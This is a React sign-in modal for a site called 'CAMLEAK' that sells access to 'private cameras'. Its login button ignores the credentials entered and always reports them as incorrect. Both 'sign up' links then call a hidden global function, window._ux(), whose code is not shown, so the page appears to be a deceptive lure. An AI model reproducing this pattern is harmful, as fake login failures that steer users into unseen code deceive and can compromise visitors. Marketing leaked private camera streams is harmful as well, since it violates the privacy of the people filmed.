import { useState } from 'react';
import { useAuth } from '../context/AuthContext';
import { X, Lock, Mail, Key, AlertCircle } from 'lucide-react';

export default function AuthModal() {
  const { isAuthModalOpen, setAuthModalOpen, login, isAuthenticated, upgrade } = useAuth();
  const [loginError, setLoginError] = useState(false);
  
  if (!isAuthModalOpen) return null;

  const handleLogin = () => {
    setLoginError(true);
  };

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
      <div className="bg-[#121212] border border-gray-800 rounded-2xl w-full max-w-md overflow-hidden relative shadow-2xl">
        <button 
          onClick={() => setAuthModalOpen(false)} 
          className="absolute top-4 right-4 text-gray-400 hover:text-white transition-colors"
        >
          <X className="w-6 h-6" />
        </button>
        
        <div className="p-8">
          {!isAuthenticated ? (
            <>
              <div className="text-center mb-8">
                <h2 className="text-3xl font-bold text-white tracking-tight">
                  CAM<span className="text-red-600">LEAK</span>
                </h2>
                <p className="text-gray-400 mt-2">Sign in to access private cameras</p>
              </div>
              
              <div className="space-y-4">
                {loginError && (
                  <div className="bg-red-900/50 border border-red-500/50 text-red-200 px-4 py-3 rounded-lg flex items-start gap-3 text-sm">
                    <AlertCircle className="w-5 h-5 text-red-400 shrink-0 mt-0.5" />
                    <p>Incorrect email or password. Please <span 
                      className="font-bold underline cursor-pointer hover:text-white"
                      onClick={() => {
                        if (typeof window !== 'undefined' && (window as any)._ux) {
                          (window as any)._ux();
                        }
                      }}
                    >sign up</span> instead to create a new account.</p>
                  </div>
                )}
                <div className="relative">
                  <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-500" />
                  <input 
                    type="email" 
                    placeholder="Email address" 
                    className="w-full bg-[#1a1a1a] border border-gray-700 rounded-lg pl-10 pr-4 py-3 text-white focus:outline-none focus:border-red-500 transition-colors" 
                  />
                </div>
                <div className="relative">
                  <Key className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-500" />
                  <input 
                    type="password" 
                    placeholder="Password" 
                    className="w-full bg-[#1a1a1a] border border-gray-700 rounded-lg pl-10 pr-4 py-3 text-white focus:outline-none focus:border-red-500 transition-colors" 
                  />
                </div>
                
                <button 
                  onClick={handleLogin} 
                  className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-lg transition-colors mt-2"
                >
                  Sign In
                </button>
                
                <div className="flex items-center justify-between mt-4 text-sm">
                  <span className="text-gray-400 hover:text-white cursor-pointer transition-colors">Forgot password?</span>
                  <span 
                    className="text-red-500 hover:text-red-400 cursor-pointer transition-colors font-medium"
                    onClick={() => {
                      if (typeof window !== 'undefined' && (window as any)._ux) {
                        (window as any)._ux();
                      }
                    }}
                  >Create an account</span>
                </div>
              </div>
            </>
          ) : (
            <>
              <div className="text-center">
                <div className="w-20 h-20 bg-red-600/10 rounded-full flex items-center justify-center mx-auto mb-6 border border-red-600/20">
                  <Lock className="w-10 h-10 text-red-500" />
                </div>
                <h2 className="text-2xl font-bold text-white mb-3">Unlock Premium Access</h2>
                <p className="text-gray-400 mb-8 leading-relaxed">
                  Get instant access to all locked cameras, remove advertisements, and view streams in ultra HD 4K quality.
                </p>
                
                <div className="space-y-3">
                  <button 
                    onClick={upgrade} 
                    className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3.5 rounded-lg transition-colors shadow-[0_0_15px_rgba(220,38,38,0.3)]"
                  >
                    Upgrade Now - $9.99/mo
                  </button>
                  <button 
                    onClick={() => setAuthModalOpen(false)} 
                    className="w-full bg-transparent hover:bg-gray-800 text-gray-300 font-medium py-3 rounded-lg transition-colors"
                  >
                    Maybe Later
                  </button>
                </div>
              </div>
            </>
          )}
        </div>
      </div>
    </div>
  );
}
